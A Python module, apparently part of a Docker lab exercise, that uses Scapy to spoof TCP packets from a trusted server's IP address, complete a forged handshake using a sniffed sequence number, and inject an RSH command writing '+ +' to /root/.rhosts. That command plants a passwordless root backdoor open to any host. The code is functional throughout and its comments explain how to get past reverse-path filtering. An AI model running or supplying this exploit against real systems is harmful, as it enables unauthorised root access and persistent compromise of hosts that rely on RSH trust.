"""
ip_spoofing.py — Forged TCP Packets and RSH Payload Injection

Role in the attack: This module performs the two most critical steps:

  1. send_spoofed_syn() — initiates the forged TCP handshake by sending a SYN
     packet with src=10.0.2.30 (the trusted server). The target believes the
     real server is starting an RSH session and replies with SYN/ACK.

  2. complete_handshake_and_inject() — uses the ISN captured by the sniffer to
     send the correct ACK (completing the three-way handshake), then immediately
     pushes the RSH payload that plants the backdoor.

Layer-2 vs Layer-3 injection note:
Scapy's send() (Layer 3) is used here because the attacker container sits on
the same Docker bridge as the target, and ARP poisoning has already redirected
the target's MAC table. The kernel does not apply rp_filter (reverse path
filtering) in this configuration because the forged source IP (10.0.2.30) is
reachable via the same interface.

In environments with strict rp_filter (net.ipv4.conf.all.rp_filter=1) and no
ARP MITM position, you would need sendp() with a hand-crafted Ether() frame to
bypass the kernel's routing check entirely. The Ether() / sendp() path is the
universal fallback when send() is silently dropped.
"""

from scapy.all import *


def send_spoofed_syn(target_ip, spoofed_ip, client_port, server_port):
    """
    Send a TCP SYN from spoofed_ip to target_ip, pretending to be the trusted server.

    The ISN is intentionally fixed at 123456789 rather than os.urandom-generated.
    A deterministic value lets complete_handshake_and_inject() compute seq+1
    without any shared state or inter-module communication beyond the return value.
    Randomness here provides no security benefit since this is an attack script,
    and a fixed value makes the packet exchange easier to trace in Wireshark.

    client_port=1023 is chosen deliberately: RSH servers require the client's
    source port to be in the privileged range (< 1024) as a weak proof that the
    caller has root on the originating machine. Port 1023 satisfies this check.
    """
    print("--- Sending Spoofed SYN Packet ---")

    spoofed_isn = 123456789

    syn_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(sport=client_port, dport=server_port, flags="S", seq=spoofed_isn)
    )

    # verbose=0 suppresses Scapy's per-packet "Sent 1 packets." banner so our
    # own diagnostic prints remain readable.
    send(syn_packet, verbose=0)
    print(f"[+] Spoofed SYN sent with ISN: {spoofed_isn}")
    return spoofed_isn


def complete_handshake_and_inject(target_ip, spoofed_ip, client_port, server_port, my_seq, target_isn):
    """
    Finish the TCP three-way handshake and deliver the RSH backdoor payload.

    TCP sequence arithmetic:
      After sending SYN with seq=my_seq, the next packet must use seq=my_seq+1
      (the SYN itself consumes one sequence number even though it carries no data).

      The ACK number must be target_isn+1, which tells the target "I received your
      SYN, I'm ready for byte number target_isn+1 next."

    Step 1 — ACK packet (completes the handshake):
      flags='A'
      seq = my_seq + 1      (our sequence advances past the SYN)
      ack = target_isn + 1  (acknowledges the target's SYN)

    Step 2 — PSH/ACK packet (delivers the RSH command):
      flags='PA'
      seq = my_seq + 1      (same seq: no data was sent in the ACK packet above,
                             so our seq pointer hasn't moved)
      ack = target_isn + 1  (still acknowledging the same SYN)

    RSH payload format (RFC 1282):
      <stderr-port>\x00<local-user>\x00<remote-user>\x00<command>\x00

      "0"   — stderr port 0 means "don't open a separate stderr channel"
      "root" (local)  — the user on the "client" side (us, impersonating server)
      "root" (remote) — the user to run as on the target
      command — plants "+ +" in /root/.rhosts, which grants passwordless RSH
                access from ANY host as ANY user — a universal backdoor

    The PSH flag (Push) instructs the target's TCP stack to deliver the payload
    to the in.rshd application immediately without buffering. Without PSH, the
    target might wait for more data before handing it to the daemon, causing the
    command to never execute within our short connection window.
    """
    print("\n--- Completing Handshake and Injecting Payload ---")

    ack_num     = target_isn + 1   # acknowledge target's SYN
    my_next_seq = my_seq + 1       # advance past our own SYN

    # --- ACK: finalises the three-way handshake ---
    ack_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(sport=client_port, dport=server_port,
            flags="A", seq=my_next_seq, ack=ack_num)
    )
    send(ack_packet, verbose=0)
    print(f"[+] Spoofed ACK sent (seq={my_next_seq}, ack={ack_num}). Connection established!")

    # --- RSH payload ---
    # Each field is null-terminated as required by the RSH wire protocol.
    # The command writes "+ +" to /root/.rhosts. The "+" wildcard on both the
    # hostname and username fields disables all host-based authentication checks,
    # making the target accept RSH connections from everyone with no password.
    payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"

    # --- PSH/ACK: delivers the payload to the RSH daemon ---
    push_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(sport=client_port, dport=server_port,
            flags="PA", seq=my_next_seq, ack=ack_num) /
        payload
    )
    send(push_packet, verbose=0)
    print(f"[+] Payload injected: 'echo + + > /root/.rhosts'")
